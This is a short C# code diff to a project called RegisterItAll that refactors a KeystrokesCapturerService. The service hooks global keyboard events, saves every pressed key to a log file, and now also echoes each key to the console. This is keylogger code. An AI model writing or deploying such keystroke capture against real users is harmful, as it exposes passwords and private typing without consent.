@@ -1,14 +1,15 @@
 ﻿using Gma.System.MouseKeyHook;
 using RegisterItAll.Managers;
 using RegisterItAll.Services.Base;
+using System;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 
 namespace RegisterItAll.Services
 {
-    public partial class KeystrokesCapturerService : ExecutableAsConsoleApplicationService
+    public partial class KeystrokesCapturerService : Service
     {
-        protected override void OnStart(string[] args)
+        public override void Run()
         {
             // This call is not awaited because it blocks the execution of the other services.
             RegisterKeyLogging();
@@ -27,7 +28,11 @@ namespace RegisterItAll.Services
 
         private static void OnKeyPressed(object sender, KeyPressEventArgs args)
         {
-            FilesManager.SaveLog(args.KeyChar.ToString());
+            string pressedKey = args.KeyChar.ToString();
+
+            FilesManager.SaveLog(pressedKey);
+
+            Console.WriteLine($"Pressed key: {pressedKey}");
         }
     }
 }
